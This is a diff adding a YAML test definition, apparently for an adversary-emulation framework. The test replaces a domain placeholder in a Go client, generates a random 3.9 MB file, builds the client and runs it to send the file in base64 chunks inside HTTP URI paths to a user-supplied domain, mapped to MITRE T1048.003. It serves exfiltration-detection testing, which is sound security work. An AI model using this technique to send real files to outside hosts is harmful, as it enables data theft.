@@ -1,0 +1,47 @@
+---
+api_version: 2.0
+uuid: 5eff2c27-1d14-4b08-aa03-261d851cc712
+name: http_uri_exfil
+authors:
+  - cedowens
+description: |
+ Creates a random 3.9MB sized file and then sends in base64 encoded chunks as part of the http uri path
+args:
+  - name: domain
+    description: The domain to use for this http data exfil test (example - blahblah.com)
+requirements:
+  platforms:
+    - os: linux
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1048 Exfiltration Over Alternative Protocol
+  subtechniques:
+    - T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol
+steps:
+  - name: replace_placeholder
+    inline: |
+      echo "Replacing the domain placeholder text in the client.go source file...."
+      cp client.go orig
+      sed -i -e 's|domain_here|{{ .Args.domain }}|g' client.go
+  - name: generate_random_file
+    inline: |
+      echo "First, generating a random 3.9 MB sized file..."
+      openssl rand -base64 3000000 > testfile.txt
+  - name: build_golang_client
+    inline: |
+      echo "Next building the client.go file..."
+      go mod init client/v2
+      go work use .
+      go build
+  - name: execute_binary
+    inline: |
+      echo "Next, executing the golang payload..."
+      ./client testfile.txt || echo "overwriting abnormal exit code..."
+    cleanup:
+      inline: |
+        echo "Removing the compiled binary and random testfile..."
+        rm client && rm testfile.txt && rm go.mod
+        mv orig client.go
+        echo "Cleanup done!"
